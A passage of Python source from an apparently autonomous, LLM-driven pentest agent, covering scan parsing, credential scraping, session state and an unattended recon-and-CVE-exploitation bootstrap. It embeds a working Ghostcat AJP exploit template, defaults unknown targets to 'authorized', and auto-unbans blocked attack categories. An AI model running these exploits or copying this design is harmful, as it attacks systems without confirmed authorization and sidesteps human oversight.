                        return finding
                    if snippet not in output:
                        print(f"{C.Y}[!] Finding '{finding.get('title','?')}' — LLM evidence snippet not found in output{C.N}")
                        return finding
                    finding["severity"] = result.get("actual_severity", finding["severity"])
                    finding["evidence"] = snippet[:500]
                    return finding
                else:
                    print(f"{C.Y}[!] Finding '{finding.get('title','?')}' rejected by LLM: {result.get('explanation','no evidence')[:100]}{C.N}")
                    return None
        except Exception as e:
            _swallow(e)
        return finding

    def _manual_verify(self, finding: dict) -> bool:
        """Independent HTTP cross-check. Rejects if the claimed URL returns a
        4xx/3xx that disproves the finding, or if the response is a login page.
        Skips verification for local/private IP targets to avoid false rejects."""
        if not finding:
            return False
        if finding.get("severity") not in ("high", "critical"):
            return True
        blob = f"{finding.get('evidence', '')} {finding.get('detail', '')}"
        m = re.search(r'https?://[^\s"\'<>]+', blob)
        if not m:
            return True
        # Skip manual verify for local/private targets — stateful apps and NAT can
        # return different responses than the original exploit run
        try:
            url_host = re.sub(r'^https?://', '', m.group(0)).split('/')[0].split(':')[0]
            addr = ipaddress.ip_address(url_host)
            if addr.is_private or addr.is_loopback or addr.is_link_local:
                return True
        except ValueError:
            pass  # hostname — proceed with verify
        try:
            import urllib3
            urllib3.disable_warnings()
            r = requests.get(m.group(0), timeout=10, verify=False, allow_redirects=True)
        except Exception:
            return True
        if r.status_code in (404, 410):
            print(f"{C.Y}[!] Manual verify: {m.group(0)} returned {r.status_code} — discarding{C.N}")
            return False
        if r.status_code in (403, 302, 301):
            body = (r.text or "").lower()
            if any(w in body for w in ("login", "sign in", "authenticate", "access denied", "forbidden")):
                print(f"{C.Y}[!] Manual verify: {m.group(0)} returned {r.status_code} with login/denied page — discarding{C.N}")
                return False
        return True

    def _extract_to_model(self, command: str, result: "ToolResult"):
        """Parse command output into the TargetModel; never let a parse error kill the loop."""
        try:
            self._extract_to_model_impl(command, result)
            self.session.data["model"] = self.model.to_dict()
            self.session.save()
            # Try auto-phase-advance after new data
            try:
                self._phase_try_advance()
            except Exception:
                pass
        except Exception as e:
            log(f"[extract] parse failed for '{command[:60]}': {e}")
            try:
                self._phase_try_advance()
            except Exception:
                pass

    def _extract_to_model_impl(self, command: str, result: "ToolResult"):
        stdout = result.stdout or ""
        # Track 404/410 URLs as 'false claim' candidates — if the AI keeps saying
        # an endpoint exists but the response is 404, we surface a strong warning.
        try:
            for url_m in re.finditer(r"https?://[^\s'\"<>]+", command):
                url = url_m.group(0).rstrip(".,)")
                if " 404" in (stdout or "") or " 410" in (stdout or "") or "not found" in (stdout or "").lower()[:500]:
                    self._false_claim_urls.add(url)
        except Exception:
            pass
        # Also catch JSP/HTML/path 404 patterns where there's no full URL
        try:
            m = re.search(r"(\/[a-zA-Z0-9_\-\./]+\.(?:jsp|php|asp|aspx|html|json|do|action))", command)
            if m and (" 404" in stdout or "not found" in stdout.lower()[:500] or "404 – not found" in stdout.lower()):
                self._false_claim_urls.add(m.group(1))
        except Exception:
            pass
        # Ports from nmap or similar
        ports = self._parse_ports(stdout)
        for p in ports:
            self.model.add_port(p["port"], p["proto"], p["service"], p.get("version", ""))

        # OS detection
        os_match = re.search(r'(?:OS|operating system)[:\s]+([^\n]+)', stdout, re.IGNORECASE)
        if os_match and not self.model.os_info:
            self.model.os_info = os_match.group(1).strip()[:200]

        # Subdomains
        subs = set(re.findall(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.){2,}[a-zA-Z]{2,}\b', stdout))
        subs = {s for s in subs if s.count('.') >= 2 and not s.startswith('http')}
        for s in subs:
            self.model.add_subdomain(s)

        # IPs
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', stdout)
        for ip in ips:
            if ip not in self.model.ip_addresses:
                self.model.ip_addresses.append(ip)

        # URLs/endpoints
        urls = re.findall(r'https?://[^\s<>"\'\[\]]+', stdout)
        for u in urls[:20]:
            self.model.add_endpoint(u)

        # Tech stack (from whatweb, wappalyzer, etc.)
        tech_lines = re.findall(r'([\w\s]+?)\[(.*?)\]', stdout)
        for name, ver in tech_lines[:10]:
            name = name.strip()
            if name and len(name) > 1:
                self.model.add_tech(name, ver)

        # Credentials — filter out common English words that regex accidentally captures
        creds = re.findall(r'(?:user|username|login|email)[=:\s]+([^,\s]+)[,\s]+(?:pass|password|pwd)[=:\s]+([^,\s]+)', stdout, re.I)
        _COMMON_WORDS = {"and", "the", "for", "are", "was", "but", "not", "you", "all", "can",
                         "had", "her", "his", "its", "may", "per", "she", "two", "use", "via",
                         "with", "from", "than", "that", "this", "your", "into", "also", "over",
                         "new", "has", "been", "were", "each", "which", "their", "what", "when",
                         "where", "there", "said", "about", "into", "more", "some", "them", "then",
                         "would", "could", "should", "after", "before", "between", "through",
                         "during", "without", "within", "along", "following", "including",
                         "regarding", "across", "down", "near", "off", "out", "up", "upon"}
        for u, p in creds[:5]:
            u_clean = u.strip().lower().rstrip(".,;:!?")
            p_clean = p.strip().lower().rstrip(".,;:!?")
            if len(u_clean) < 3 or len(p_clean) < 3:
                continue
            if u_clean in _COMMON_WORDS or p_clean in _COMMON_WORDS:
                continue
            self.model.add_credential("unknown", u, p, command[:80])

        stderr = getattr(result, "stderr", "") or ""
        # Route parser layers if tool identified
        if "httpx" in command:
            from parsers.httpx import HttpxParser
            for ep in HttpxParser().parse(command, stdout, stderr):
                self.model.add_endpoint(ep["url"], status=ep["status"])
        elif "gobuster" in command:
            from parsers.gobuster import GobusterParser
            for ep in GobusterParser().parse(command, stdout, stderr):
                self.model.add_endpoint(ep["url"], status=ep["status"])
        elif "ffuf" in command:
            from parsers.ffuf import FfufParser
            for ep in FfufParser().parse(command, stdout, stderr):
                self.model.add_endpoint(ep["url"], status=ep["status"])
        else:
            # Live hosts from httpx output (capture status code for scoring) - Fallback
            if '[200]' in stdout or '[301]' in stdout or '[302]' in stdout:
                for m in re.finditer(r'(https?://[^\s\[]+)\s*\[(\d{3})\]', stdout):
                    self.model.add_endpoint(m.group(1).rstrip('/'), status=int(m.group(2)))
                live = re.findall(r'(https?://[^\s]+)\s+\[', stdout)
                for l in live:
                    self.model.add_endpoint(l)
        # Structured telemetry for the new WorldModel layer
        try:
            wm = self.world_model
            tool_name = self._tool_name(command) or "unknown"
            wm.provenance = f"agent:{tool_name}:{datetime.now().isoformat()}"
            if "nmap" in command or "masscan" in command:
                wm.mark_check_complete("port_scan")
                if not wm.hosts:
                    wm.add_unknown("open_ports")
            if "httpx" in command:
                wm.mark_check_complete("liveness_check")
            if "gobuster" in command or "ffuf" in command:
                wm.mark_check_complete("web_directory_enum")
            if "nuclei" in command:
                wm.mark_check_complete("vuln_scan")
            if "whatweb" in command:
                wm.mark_check_complete("tech_fingerprint")
            if wm.hosts:
                primary = list(wm.hosts.values())[0]
                if primary.services:
                    wm.confidence = min(1.0, wm.confidence + 0.1)
        except Exception:
            pass

    @staticmethod
    def _resolve_target_type(target: str, configured: str) -> str:
        """Auto-detect target type if configured as 'auto'."""
        if configured != "auto":
            return configured
        target = target.strip().lower()
        # Local artifacts (mobile apps, binaries) -> local analysis, full testing allowed
        if re.search(r'\.(apk|ipa|aab|dex|jar|so|elf|exe|bin|war)$', target):
            return "authorized"
        # Private/local -> assume authorized
        private_patterns = [
            r'^10\.', r'^172\.(1[6-9]|2\d|3[01])\.', r'^192\.168\.',
            r'^127\.', r'^localhost$', r'^0\.',
            r'^::1$', r'^fe80:', r'^fc00:', r'^fd00:',
            r'\.local$', r'\.internal$', r'\.lan$',
        ]
        for pat in private_patterns:
            if re.match(pat, target):
                return "authorized"
        # CTF/lab/challenge domains — allow full attack chain
        ctf_hints = ["ctf", "hackme", "hack.me", "capturetheflag", "challenge", "vulnhub", "hackthebox", "tryhackme"]
        if any(h in target for h in ctf_hints):
            return "ctf"
        # Has domain-like pattern (contains dots, not IP) -> public
        if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.\-]+\.[a-zA-Z]{2,}', target) and not re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
            return "public_real_world"
        # Public IP range (not private)
        try:
            ip = ipaddress.ip_address(target)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return "authorized"
            return "public_real_world"
        except ValueError:
            pass
        return "authorized"  # safe default

    @staticmethod
    def _normalize_domain(target: str) -> str:
        t = target.strip()
        t = re.sub(r"^https?://", "", t, flags=re.I)
        return t.split("/")[0].split(":")[0]

    def _configure_execution_scope(self, target: str):
        """Refresh command-gateway policy for this mission target."""
        try:
            self.command_gateway.policy_engine = PolicyEngine(policy_from_config(target))
            if CONFIG.ENFORCE_SCOPE:
                allowed = sorted(self.command_gateway.policy_engine.policy.allowed_targets)
                print(f"{C.G}[+] Scope enforcement enabled: {', '.join(allowed) or target}{C.N}")
        except Exception as e:
            log(f"[scope] policy configuration failed: {e}")

    def _run_commands_parallel(self, commands: List[Tuple[str, int]]) -> List[Tuple[str, "ToolResult"]]:
        """Run independent shell commands concurrently (bug bounty speed path)."""
        if not commands:
            return []
        results: List[Tuple[str, "ToolResult"]] = []
        workers = min(CONFIG.PARALLEL_WORKERS, len(commands))
        # Overall cap: longest per-command timeout + buffer, so a wedged worker can't block forever.
        overall = max((to for _, to in commands), default=120) + 60
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(self._execute_and_store, cmd, to): cmd for cmd, to in commands}
            try:
                for fut in as_completed(futures, timeout=overall):
                    cmd = futures[fut]
                    try:
                        results.append((cmd, fut.result()))
                    except Exception as e:
                        results.append((cmd, ToolResult("", str(e), -1, "error")))
            except TimeoutError:
                for fut, cmd in futures.items():
                    if not fut.done():
                        fut.cancel()
                        results.append((cmd, ToolResult("", f"parallel timeout after {overall}s", -1, "timeout")))
        return results

    def _bug_bounty_bootstrap(self, target: str) -> str:
        """Hands-free recon burst before the AI loop (parallel, no human input)."""
        domain = self._normalize_domain(target)
        if not domain:
            return ""
        print(f"{C.BOLD}{C.M}[BB] Autonomous bootstrap on {domain} (parallel recon){C.N}")

        jobs: List[Tuple[str, int]] = []
        if self._check_tool("subfinder"):
            jobs.append((f"subfinder -d {domain} -silent 2>/dev/null | head -80", 120))
        elif self._check_tool("amass"):
            jobs.append((f"amass enum -passive -d {domain} 2>/dev/null | head -80", 180))
        else:
            jobs.append((f"dig +short {domain} A {domain} AAAA 2>/dev/null; dig +short www.{domain} A 2>/dev/null", 30))

        if self._check_tool("httpx"):
            jobs.append((
                f"printf 'http://{domain}\\nhttps://{domain}\\nhttps://www.{domain}\\n' | "
                f"httpx -s -status-code -title -tech-detect -follow-redirects "
                f"-ports 80,443,8080,8443 -json -o {self.workspace}/httpx.json 2>/dev/null; "
                f"cat {self.workspace}/httpx.json 2>/dev/null | head -40",
                90,
            ))
        else:
            jobs.append((f"curl -sI -L --max-redirs 5 http://{domain} 2>/dev/null | head -30", 30))

        if self._check_tool("katana"):
            jobs.append((f"katana -u https://{domain} -d 2 -silent 2>/dev/null | head -60", 120))
        elif self._check_tool("gau"):
            jobs.append((f"gau {domain} 2>/dev/null | head -60", 90))

        if self._check_tool("nuclei") and not is_fast_mode():
            jobs.append((
                f"nuclei -u https://{domain} -t cves,misconfigurations,exposures,technologies "
                f"-silent -rl 80 2>/dev/null | head -40",
                180,
            ))
        elif is_fast_mode() and self._check_tool("nuclei"):
            jobs.append((
                f"nuclei -u https://{domain} -t exposures,misconfigurations -silent -rl 120 2>/dev/null | head -25",
                90,
            ))

        summaries = []
        for cmd, result in self._run_commands_parallel(jobs):
            print(f"{C.B}[BB] done ({result.returncode}): {cmd[:70]}...{C.N}")
            self._extract_to_model(cmd, result)
            self.session.add_cmd(cmd[:200], result.text[:500], "bootstrap", result.returncode)
            summaries.append(f"$ {cmd}\n{(result.text or result.stderr)[:1500]}")

        # Phase 3: CVE-driven active exploitation. If tech_stack was filled by whatweb/nuclei,
        # auto-generate concrete commands for known CVEs. Top-3 by severity are added as jobs.
        cve_jobs: List[Tuple[str, int]] = []
        try:
            if self.model.tech_stack:
                cve_plan = CveMapper().plan(dict(self.model.tech_stack), f"https://{domain}")
                for entry in cve_plan[:3]:
                    if entry.get("command"):
                        cve_jobs.append((entry["command"], 60))
                        print(f"{C.Y}[BB-CVE] queued: {entry['cve']} — {entry['title']}{C.N}")
        except Exception as e:
            log(f"[BB-CVE] plan failed: {e}")
        if cve_jobs:
            print(f"{C.M}[BB-CVE] Running {len(cve_jobs)} CVE exploit commands...{C.N}")
            for cmd, result in self._run_commands_parallel(cve_jobs):
                print(f"{C.B}[BB-CVE] done ({result.returncode}): {cmd[:70]}...{C.N}")
                self._extract_to_model(cmd, result)
                self.session.add_cmd(cmd[:200], result.text[:500], "cve_exploit", result.returncode)
                summaries.append(f"[CVE] $ {cmd}\n{(result.text or result.stderr)[:1500]}")

        self.model.add_subdomain(domain)
        self.model.add_subdomain(f"www.{domain}")
        for p in (80, 443):
            self.model.add_port(p, "tcp", "http" if p == 80 else "https", "")

        summary = (
            f"[BOOTSTRAP COMPLETE — {len(jobs)} parallel jobs]\n"
            f"Subdomains: {len(self.model.subdomains)} | Endpoints: {len(self.model.endpoints)} | "
            f"Ports: {len(self.model.ports)}\n"
            + "\n---\n".join(summaries[:4])
        )
        print(f"{C.G}[BB] Surface: {len(self.model.subdomains)} subs, {len(self.model.endpoints)} URLs{C.N}")
        return summary[:6000]

    def _reset_for_target(self, target: str):
        """Reset per-target state so a reused agent never mixes data across targets."""
        self.target = target
        self.model = TargetModel(hostname=target)
        safe = re.sub(r'[^\w\-.]', '_', target)[:60] or "target"
        self._legacy_exec = ToolExecutor(str(Path(CONFIG.WORKSPACE) / safe), mcp_client=self.mcp)
        self.command_gateway = CommandGateway(self._legacy_exec)
        self.exec = GatewayExecutorAdapter(self._legacy_exec, self.command_gateway)
        self._output_counter = 0
        # Anti-loop tracking
        self._cmd_hashes = set()
        self._cmd_hashes_stripped = set()
        # Reset no-progress + same-script counters per-target
        self._no_progress_streak = 0
        self._iter_start_size = 0
        self._normalized_cmd_counts = {}
        # Reset 404'd-URL set per-target
        self._false_claim_urls = set()
        self._stuck_warnings = []
        self._service_iters = {}
        self._last_service_category = "init"
        self._auth_attack_blocked = 0
        self._file_read_streak = 0
        self._conn_fail_streak = 0
        self._plan_sigs = {}
        self._last_commands = []
        # FLUSH persistent AntiLoopEngine state — each new scan starts fresh,
        # otherwise signatures from prior sessions (e.g. 8x nmap) trigger
        # circuit breaker on the very first command of a new scan.
        try:
            # Call reset() on the existing singleton — the __init__ does _load()
            # from disk, so creating a new instance wouldn't help.
            _aloop = get_antiloop()
            if hasattr(_aloop, "reset"):
                _aloop.reset()
            self.loop_detector = _aloop
        except Exception as e:
            log(f"[Reset] antiloop singleton refresh failed: {e}")
        # Also clear in-memory category bans
        self._banned_categories = set()
        self._dead_branches = set()
        self._exhausted_techniques = set()
        # Clear per-target failure tracking so core tools are not blocked
        self._broken_tools = {"nikto"}
        self._tool_failure_counts = {}
        try:
            self.failure_memory._data = {
                "failures": {},
                "categories": {},
            }
        except Exception:
            pass
        self.poc_chain = []
        self._poc_mode = False
        self._poc_finding_title = ""
        self._exploitation_success = False
        self._last_reflection = ""
        self._primary_web_port = None
        self._current_plan = None
        self._plan_step_index = 0
        self._plan_results = []
        self._output_hashes = []
        self._category_hard_limits = {}
        self._banned_categories = set()
        self._no_progress_streak = 0
        self._last_unban_iter = -1
        self._iter_start_size = 0
        self._normalized_cmd_counts = {}
        self._false_claim_urls = set()
        self._seen_memory_ids = set()
        self._good_run_count = 0
        self._probed = {}
        self._body_paths = {}
        self._walls = set()
        self._fp_records = {}
        self._fp_counts = {}
        self._fp_baseline = {}
        self._seen_hashes = set()
        self._exhausted_endpoints = set()
        self._branch_runs = {}
        self._dead_branches = set()
        self._tool_effect = {}
        self._tool_zero_gain_streak = {}
        self._tool_family_history = []
        self._executed_tool_names = set()
        self._exhausted_fingerprints = set()
        self._exhausted_techniques = set()
        self._exhausted_by_cat = {}
        self._probe_log = []
        self._cloudflare = False
        self._cf_count = 0
        self._constraints = []
        self._vector_codes = {}
        self._terminated_vectors = set()
        self._hypotheses = {}
        self._banned_plan_categories = set()
        self._recon_no_progress_count = 0
        self._recon_total = 0
        self._forced_exploit = False
        self._loop_sig = LoopSignal()
        self._consecutive_blocked_plans = 0
        self._consecutive_blocked_cmds = 0
        self.goal_tree = GoalTree()
        self.loop_detector = LoopDetector()
        self.mission_manager.reset_for_target(target)

    def _save_model_state(self):
        """Save current target model state to JSON for crash recovery."""
        target = self.target
        if not target:
            return
        safe = re.sub(r'[^\w\-.]', '_', target)[:60]
        state_dir = Path(CONFIG.WORKSPACE) / "sessions"
        state_dir.mkdir(parents=True, exist_ok=True)
        state_file = state_dir / f"{safe}_state.json"

        model = self.model
        data = {
            "hostname": model.hostname,
            "ip_addresses": list(getattr(model, "ip_addresses", [])),
            "ports": [
                {k: v for k, v in p.items() if k != "key"}
                for p in getattr(model, "ports", [])
            ],
            "os_info": model.os_info or "",
            "subdomains": list(getattr(model, "subdomains", set())),
            "endpoints": getattr(model, "endpoints", []),
            "credentials": [
                {k: v for k, v in c.items() if k != "password" or v}
                for c in getattr(model, "credentials", [])
            ],
            "tech_stack": dict(getattr(model, "tech_stack", {})),
            "findings": [
                {"severity": f.severity, "title": f.title,
                 "description": f.description[:200], "evidence": f.evidence[:300],
                 "source": f.source}
                for f in getattr(model, "findings", [])
            ],
            "notes": getattr(model, "notes", [])[:20],
            "saved_at": datetime.now().isoformat(),
        }
        try:
            state_file.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
            log(f"[State] Saved model state to {state_file.name}")
        except Exception as e:
            log(f"[State] Save failed: {e}")

    def _load_model_state(self, target: str) -> bool:
        """Load saved model state for target. Returns True if state was restored."""
        if not target:
            return False
        safe = re.sub(r'[^\w\-.]', '_', target)[:60]
        state_file = Path(CONFIG.WORKSPACE) / "sessions" / f"{safe}_state.json"
        if not state_file.exists():
            return False
        try:
            data = json.loads(state_file.read_text(encoding="utf-8"))
            model = self.model
            model.hostname = data.get("hostname", target)
            for ip in data.get("ip_addresses", []):
                if ip not in model.ip_addresses:
                    model.ip_addresses.append(ip)
            for p in data.get("ports", []):
                model.add_port(
                    port=p["port"], proto=p.get("proto", "tcp"),
                    service=p.get("service", ""), version=p.get("version", ""),
                    state=p.get("state", "open"),
                )
            if data.get("os_info"):
                model.os_info = data["os_info"]
            for s in data.get("subdomains", []):
                model.add_subdomain(s)
            for ep in data.get("endpoints", []):
                model.add_endpoint(
                    url=ep["url"], method=ep.get("method", "GET"),
                    params=ep.get("params", ""), tech=ep.get("tech", ""),
                    status=ep.get("status", 0),
                )
            for c in data.get("credentials", []):
                model.add_credential(
                    service=c.get("service", ""),
                    username=c.get("username", ""),
                    password=c.get("password", ""),
                    source=c.get("source", ""),
                )
            for k, v in data.get("tech_stack", {}).items():
                model.add_tech(k, v)
            from reporting import Finding
            for fd in data.get("findings", []):
                f = Finding(
                    severity=fd.get("severity", "info"),
                    title=fd.get("title", ""),
                    description=fd.get("description", ""),
                    evidence=fd.get("evidence", ""),
                    source=fd.get("source", "resume"),
                )
                if not any(ex.title == f.title for ex in model.findings):
                    model.findings.append(f)
            for n in data.get("notes", []):
                if n not in model.notes:
                    model.notes.append(n)
            log(f"[State] Restored: {len(model.ports)} ports, "
                f"{len(model.findings)} findings, {len(model.subdomains)} subs")
            print(f"{C.G}[+] Resumed session for {target}: {len(model.ports)} ports, "
                  f"{len(model.findings)} findings restored{C.N}")
            return True
        except Exception as e:
            log(f"[State] Load failed for {target}: {e}")
            return False

    def _resume_model(self, target: str):
        """Reload the most recent prior recon snapshot for this target so state isn't lost between sessions."""
        try:
            d = Path(CONFIG.SESSIONS_DIR)
            best, best_mtime = None, -1.0
            for f in d.glob("x19_*.json"):
                if f.stem == self.session.id:
                    continue
                try:
                    data = json.loads(f.read_text(encoding="utf-8"))
                except Exception as e:
                    _swallow(e)
                    continue
                if data.get("target") == target and data.get("model") and f.stat().st_mtime > best_mtime:
                    best, best_mtime = data["model"], f.stat().st_mtime
            if best:
                self.model.load_dict(best)
                print(f"{C.G}[+] Resumed prior recon: {len(self.model.subdomains)} subdomains, {len(self.model.ports)} ports{C.N}")
        except Exception as e:
            log(f"[resume] failed: {e}")

    @staticmethod
    def _tool_flag_signature(cmd: str) -> str:
        """Generate a tool+flag signature for tracking which tool+option combos fail.
        E.g., 'nmap -p- -sV target' -> 'nmap|-p-|-sV'"""
        if not cmd:
            return ""
        parts = cmd.strip().split()
        if not parts:
            return ""
        tool = parts[0].lower()
        flags = sorted(p for p in parts[1:] if p.startswith("-"))
        return f"{tool}|{'|'.join(flags)}"

    @staticmethod
    def _normalize_command(cmd: str) -> str:
        """Normalize a shell command so that trivially-different variants hash equal.
        Goal: catch the AJP-Ghostcat-style 'same script, slightly different comments'
        loop. Strips comments, normalizes whitespace, collapses temp paths, removes
        b'' byte-literal variance, normalizes struct.pack arguments to a canonical
        form, lowercases, and keeps only the structural tokens.
        """
        if not cmd:
            return ""
        s = cmd
        # 1. Strip shell comments (lines starting with #, after `<<'PY'` blocks)
        s = re.sub(r'(?m)^\s*#.*$', '', s)
        s = re.sub(r'#[^\n]*', '', s)
        # 2. Collapse temp paths
        s = re.sub(r'/tmp/[a-zA-Z0-9_\.\-]+', '/tmp/_', s)
        s = re.sub(r'/root/[a-zA-Z0-9_\.\-/]+', '/root/_', s)
        # 3. Normalize struct.pack('>H', 0xXX) and similar to a canonical "STRUCT_PACK"
        s = re.sub(r"struct\.pack\s*\([^)]*\)", "STRUCT_PACK(...)", s)
        # 4. Normalize b"\xXX\xYY" byte literals to BYTES
        s = re.sub(r"b(['\"])(?:\\x[0-9a-fA-F]{2}|[^'\"\\])*\1", "BYTES", s)
        # 5. Collapse all whitespace
        s = re.sub(r'\s+', ' ', s).strip()
        # 6. Strip the trailing heredoc-close token ("py", "eof", "sh") so the
        #    same script with the closing-tag in the output doesn't split variants
        s = re.sub(r'\b(py|eof|sh|bash|zsh)\s*$', '', s).strip()
        # 7. Lowercase
        s = s.lower()
        # 8. Truncate to keep hashes small
        return s[:400]

    def _record_normalized_cmd(self, command: str) -> int:
        """Track how many times a normalized-command has run. Returns the count."""
        norm = self._normalize_command(command)
        if not norm:
            return 0
        c = self._normalized_cmd_counts.get(norm, 0) + 1
        self._normalized_cmd_counts[norm] = c
        return c

    @staticmethod
    def _is_ajp_related(command: str) -> bool:
        """True if the command is touching AJP / port 8009 / Ghostcat."""
        cl = (command or "").lower()
        return any(kw in cl for kw in ("8009", "ajp", "ghostcat", "cve-2020-1938"))

    def _ajp_template_for_target(self) -> str:
        """Return X19's working ajp_ghostcat template command, filled with the target."""
        # Pull the template from the TOOLS registry if present
        tpl = None
        if not tpl:
            tpl = (
                "python3 -c \"import socket;s=socket.socket();"
                "s.settimeout(8);s.connect(('{host}',8009));"
                "s.send(b'\\x00\\x0b\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
                "\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
                "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x0c\\x00\\x00\\x00"
                "\\x00\\x00\\x00\\x00\\x0c\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
                "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x0b"
                "\\x00\\x00\\x00\\x0d\\x00\\x0c/WEB-INF/web.xml');"
                "out=s.recv(4096);print(out[:500])\""
            )
        # Substitute host
        host = (self.target or "").strip().lower()
        host = re.sub(r'^https?://', '', host).split('/')[0]
        return tpl.replace("{host}", host)

    def _should_force_ajp_template(self, plan_commands: list) -> bool:
        """Decide whether to REPLACE hand-rolled AJP python scripts with X19's
        working template. Trigger: at least 2 normalized AJP attempts already
        failed AND the current plan contains another hand-rolled AJP script.
        """
        ajp_cmds = [c for c in plan_commands if self._is_ajp_related(c)]
        if not ajp_cmds:
            return False
        # Count how many AJP python heredoc attempts have happened
        ajp_python_attempts = sum(
            1 for c in self._normalized_cmd_counts.keys()
            if "python" in c and self._is_ajp_related(c)
        )
        if ajp_python_attempts < 2:
            return False
        # Make sure this is a hand-rolled script (python heredoc / python3 -c) — NOT
        # already using the X19 template (which would have the exact known packet bytes)
        known_template_marker = b"\\x00\\x0b\\x00\\x01\\x00\\x18"
        for c in ajp_cmds:
            # If the script is plain `python3 -c "..."` with the X19 marker, leave it.
            if "python3 -c" in c and "\\x00\\x0b" in c:
                # Looks like it might be the template; only replace if it's been failing.
                continue
            # Otherwise it's a hand-rolled heredoc-style script — replace it.
            return True
        return False

    def _maybe_auto_unban(self, iteration: int) -> None:
        """If the agent is soft-locked (categories banned + no progress), unban the
        most recently banned one. Prevents the 'web target with web category banned'
        deadlock. Only fires once every 5 iterations to avoid thrash.
        Also clears the matching entry from _dead_branches and resets the
        per-category branch-runs counter, so the dead-branch cycle doesn't
        immediately re-trigger right after the unban.
        """
        if not self._banned_categories:
            return
        if self._no_progress_streak < 3:
            return
        if iteration - self._last_unban_iter < 5:
            return
        # Pick the most recently added (set is unordered; we approximate by length)
        victim = sorted(self._banned_categories)[-1]
        self._banned_categories.discard(victim)
        self._banned_plan_categories.discard(victim)
        # Also clear dead_branches + branch_runs for the unbanned category so the
        # dead-branch cycle doesn't restart the second we re-enter the category.
        self._dead_branches.discard(victim)
        self._branch_runs.pop(victim, None)
        # Clear blocked plan signatures so the AI gets a fresh start
        self._blocked_plan_signatures.clear()
        self._consecutive_blocked_plans = 0
        self._no_progress_streak = 0
        self._last_unban_iter = iteration
        self._stuck_warnings.append(
            f"Soft-lockout detected (no-progress x{self._no_progress_streak}). "
            f"AUTO-UNBANNED '{victim}' (also cleared dead_branch + branch_runs) — "
            f"re-attempt with a different approach."
        )
        print(f"{C.BOLD}{C.Y}[!] AUTO-UNBAN — '{victim}' was soft-locking the session. "
              f"Pivot now (different tool family/technique).{C.N}")

    def _verify_exploit_evidence(self, output: str, command: str = "") -> Optional[str]:
        """Stricter version of check_exploit_success. Returns the matched marker ONLY
        if the output also passes a 'not-just-an-error-page' filter. Stops the
        'Tomcat 500 stack trace = exploit success' hallucination.
        """
        if not output:
            return None
        lower = output.lower()
        # Check for genuine exploit/flag indicators first — these override noise filters
        has_exploit_proof = any(k in lower for k in [
            'flag{', 'ctf{', 'uid=', 'root:', 'shadow:',
            'proof', 'poc', 'vulnerability confirmed',
        ])
        # HTTP 200 + success marker = legit
        has_200 = 'http/1.1 200' in lower or 'http/1.0 200' in lower
        has_5xx = any(m in lower for m in ('http/1.1 5', 'http/1.1 500', 'http/1.1 403', 'http/1.1 404', 'http/1.1 401', 'http/1.1 502', 'http/1.1 503'))
        # If it's clearly an error page, refuse to call it success
        if has_5xx and not has_200 and not has_exploit_proof:
            return None
        if 'arrayindexoutofboundsexception' in lower and not has_exploit_proof:
            return None
        # Only reject timeout/connection-refused when there is NO exploit proof
        if not has_exploit_proof:
            if 'connection refused' in lower or 'timed out' in lower or 'timeout' in lower:
                return None
        # Now run the legacy pattern check
        return self.check_exploit_success(output)

    def autonomous_loop(self, target: str):
        try:
            return self._autonomous_loop_impl(target)
        finally:
            self.running = False

    RECON_CATS = {"subdomain_recon", "dns_recon", "port_scan", "network", "fingerprint", "web_dirbust", "web_scanner", "web"}

    def _generate_planner_initial_recon(self, target: str) -> List[Tuple[str, int]]:
        """DEPRECATED: This method contained hardcoded commands.
        
        Initial recon is now generated by the LLM through genuine reasoning.
        The Planner builds context from World Model, then asks the LLM to
        decide the first information-gathering actions.
        
        Returns empty list - commands come from LLM decision cycle instead.
        """
        # All initial recon now flows through the normal AI decision pipeline:
        # 1. World Model is seeded with target entity
        # 2. Planner builds context showing empty/unknown state
        # 3. LLM reasons about what information is missing
        # 4. LLM generates appropriate recon commands
        # 
        # No hardcoded commands here - that would defeat autonomy.
        return []

    def _execute_planner_commands(self, cmds: List[Tuple[str, int]], context_tag: str = "planner_recon") -> str:
        """Execute a list of planner-generated commands and update the model.
        
        This is the execution primitive that both bootstrap and parallel recon use.
        All execution flows through this method to ensure consistent model updates.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        results = []
        print(f"{C.BOLD}{C.C}[PLANNER-DRIVEN] Executing {len(cmds)} commands{C.N}")
        
        # Execute sequential commands first
        sequential_count = min(2, len(cmds))
        for i in range(sequential_count):
            cmd, to = cmds[i]
            try:
                r = self.exec.run(cmd, timeout=to)
                if r and r.text:
                    self._extract_to_model(cmd, r)
                    self._register_probe(cmd, r)
                    self.session.add_cmd(cmd, r.text[:500], context_tag, r.returncode)
                    results.append((cmd, r))
                    print(f"{C.D}[seq] {cmd[:80]} -> exit {r.returncode}, {len(r.text)}b{C.N}")
            except Exception as e:
                log(f"[seq] {cmd[:60]}: {e}")
        
        # Execute remaining commands in parallel
        parallel_cmds = cmds[sequential_count:]
        if parallel_cmds:
            max_workers = min(10, len(parallel_cmds))
            print(f"{C.B}[PARALLEL] Launching {len(parallel_cmds)} commands across {max_workers} threads...{C.N}")
            
            with ThreadPoolExecutor(max_workers=max_workers) as pool:
                futures = {pool.submit(self.exec.run, cmd, timeout=to): cmd for cmd, to in parallel_cmds}
                for fut in as_completed(futures, timeout=180):
                    cmd = futures[fut]
                    try:
                        r = fut.result()
                        results.append((cmd, r))
                        if r and r.text:
                            self._extract_to_model(cmd, r)
                            self._register_probe(cmd, r)
                            self.session.add_cmd(cmd, r.text[:500], context_tag, r.returncode)
                            print(f"{C.D}[para] {cmd[:90]} -> exit {r.returncode}, {len(r.text)}b{C.N}")
                    except Exception as e:
                        log(f"[para] {cmd[:60]}: {e}")
        
